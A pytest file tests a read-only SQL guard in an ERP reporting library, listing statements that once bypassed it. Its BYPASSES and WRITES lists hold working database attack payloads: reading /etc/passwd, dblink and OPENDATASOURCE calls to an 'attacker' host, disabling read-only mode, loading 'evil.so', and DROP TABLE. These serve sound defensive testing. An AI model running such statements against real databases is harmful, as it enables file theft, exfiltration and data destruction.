"""The read-only guard, pinned against the bypasses an audit actually found.

Every statement in BYPASSES was verified to pass the guard before it grew a
function check - a "read-only" guard that inspected a statement's shape and
never asked what it called. They are kept here by name so the claim in
connect.py's docstring stays a fact rather than a slogan.

The guard is tested per dialect. It used to be exercised only dialect-blind,
which is how tsql- and mysql-only constructs went unnoticed.
"""

from __future__ import annotations

import pytest

from erp_report_engine.connect import ReadOnlyViolation, assert_read_only

# (id, sqlglot dialect, sql) - all of these once returned ALLOWED
BYPASSES = [
    # PostgreSQL: reads a server file straight off disk
    ("pg_read_file", "postgres", "SELECT pg_read_file('/etc/passwd')"),
    # PostgreSQL: WRITES a server file. A SELECT that is not a read.
    ("lo_export", "postgres", "SELECT lo_export(lo_import('/etc/passwd'), '/tmp/x')"),
    # PostgreSQL: opens an outbound connection - SSRF and exfiltration
    ("dblink", "postgres", "SELECT * FROM dblink('host=attacker','SELECT 1') AS t(x int)"),
    # PostgreSQL: turns the read-only session backstop OFF from inside a SELECT
    ("set_config", "postgres", "SELECT set_config('default_transaction_read_only','off',false)"),
    # PostgreSQL: re-enters the executor with arbitrary SQL
    ("query_to_xml", "postgres", "SELECT query_to_xml('SELECT 1', true, false, '')"),
    ("pg_sleep", "postgres", "SELECT pg_sleep(100000)"),
    # MSSQL: ad-hoc bulk/remote sources. NOTE: sqlglot cannot parse OPENROWSET(BULK ..)
    # at all, so this one is caught by the lexical net - which is why it exists.
    ("openrowset", "tsql", "SELECT * FROM OPENROWSET(BULK 'C:/Windows/win.ini', SINGLE_CLOB) AS x"),
    ("openquery", "tsql", "SELECT * FROM OPENQUERY(srv, 'SELECT 1')"),
    ("opendatasource", "tsql",
     "SELECT * FROM OPENDATASOURCE('SQLNCLI','Server=attacker;Trusted_Connection=yes').db.dbo.t"),
    # MySQL: file read, and two unbounded time sinks
    ("load_file", "mysql", "SELECT LOAD_FILE('/etc/passwd')"),
    ("sleep", "mysql", "SELECT SLEEP(100000)"),
    ("benchmark", "mysql", "SELECT BENCHMARK(1000000, MD5('x'))"),
    # SQLite: loading an extension is arbitrary code execution
    ("load_extension", "sqlite", "SELECT load_extension('evil.so')"),
]

WRITES = [
    ("drop", "postgres", "DROP TABLE orders"),
    ("cte_insert", "postgres", "WITH x AS (INSERT INTO t VALUES (1) RETURNING *) SELECT * FROM x"),
    ("two_statements", "postgres", "SELECT 1; DROP TABLE t"),
    ("select_into", "tsql", "SELECT * INTO backup FROM orders"),
    ("comment", "postgres", "SELECT 1 -- and then some"),
    ("update", "postgres", "UPDATE orders SET net_total = 0"),
    ("lock_hint", "tsql", "SELECT * FROM orders WITH (TABLOCKX)"),
]

READS = [
    ("aggregate", "postgres", "SELECT customer, SUM(net_total) FROM orders GROUP BY customer"),
    ("join", "tsql", "SELECT o.order_id, l.qty FROM orders o JOIN order_lines l ON l.order_id = o.order_id"),
    ("cte_window", "tsql",
     "WITH r AS (SELECT ROW_NUMBER() OVER (ORDER BY d) n FROM t) SELECT * FROM r WHERE n = 1"),
    ("union", "postgres", "SELECT a FROM t1 UNION SELECT a FROM t2"),
    ("case_coalesce", "mysql", "SELECT CASE WHEN x > 0 THEN COALESCE(y, 0) ELSE 0 END FROM t"),
]


@pytest.mark.parametrize(("name", "dialect", "sql"), BYPASSES, ids=[c[0] for c in BYPASSES])
def test_side_effecting_function_is_refused(name, dialect, sql):
    with pytest.raises(ReadOnlyViolation):
        assert_read_only(sql, dialect=dialect)


@pytest.mark.parametrize(("name", "dialect", "sql"), WRITES, ids=[c[0] for c in WRITES])
def test_write_is_refused(name, dialect, sql):
    with pytest.raises(ReadOnlyViolation):
        assert_read_only(sql, dialect=dialect)


@pytest.mark.parametrize(("name", "dialect", "sql"), READS, ids=[c[0] for c in READS])
def test_real_reads_still_pass(name, dialect, sql):
    assert_read_only(sql, dialect=dialect)          # a guard that blocks real work is useless
    assert_read_only(sql, dialect=dialect, strict=True)


def test_the_guard_fails_closed_when_it_cannot_parse():
    """A guard that cannot read a statement has nothing to say about it.

    This used to return silently on the theory that the lexical guard still held
    - but the lexical guard had never heard of OPENROWSET, and OPENROWSET is
    exactly what fails to parse.
    """
    with pytest.raises(ReadOnlyViolation, match="could not parse"):
        assert_read_only("SELECT * FROM t WHERE ((((", dialect="postgres")


def test_keywords_inside_string_literals_are_data_not_code():
    """The lexical scan blanks literals first. Blocking this taught users the
    guard was superstitious rather than principled - and superstition is what
    gets a guard switched off."""
    assert_read_only("SELECT 'please delete this note' AS note", dialect="postgres")
    assert_read_only("SELECT 'shipped into the warehouse' AS msg", dialect="postgres")
    assert_read_only("SELECT * FROM orders WHERE note = 'drop shipment'", dialect="postgres")


def test_a_column_named_like_a_dangerous_function_is_fine():
    assert_read_only("SELECT sleep FROM logs", dialect="mysql")


def test_strict_mode_default_denies_functions_the_guard_cannot_name():
    """The agent path. sqlglot's registry is the allowlist: it knows the portable
    analytic functions and nothing that reads a file or dials out."""
    vendor = "SELECT dbo.fn_Custom(1) FROM t"
    assert_read_only(vendor, dialect="tsql")                       # operator SQL: allowed
    with pytest.raises(ReadOnlyViolation, match="strict mode"):    # agent SQL: denied
        assert_read_only(vendor, dialect="tsql", strict=True)


def test_every_bundled_profile_passes_strict_mode():
    """The bundled profiles use no anonymous functions at all, which is what
    makes default-deny affordable rather than theoretical."""
    import re

    from erp_report_engine.connect import _SQLGLOT_DIALECT
    from erp_report_engine.semantic import bundled_profiles, load_profile

    names = bundled_profiles()
    assert {"generic", "logo_tiger", "netsis", "mikro"} <= set(names)
    for name in names:
        prof = load_profile(name)
        dialect = _SQLGLOT_DIALECT.get(prof.dialect)
        for entity, query in prof.entities.items():
            sql = re.sub(r"\{([A-Za-z0-9_]+)\}", "X", query)
            assert_read_only(sql, dialect=dialect, strict=True), f"{name}:{entity}"
